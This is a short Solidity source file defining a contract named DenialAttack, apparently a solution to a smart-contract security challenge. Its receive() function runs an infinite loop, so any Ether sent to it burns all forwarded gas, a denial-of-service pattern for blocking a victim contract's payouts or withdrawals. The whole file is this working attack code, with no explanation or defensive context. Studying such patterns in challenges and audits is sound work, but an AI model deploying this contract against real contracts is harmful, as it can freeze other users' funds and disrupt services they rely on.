// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract DenialAttack {
    receive() external payable {
        while (true) {}
    }
}
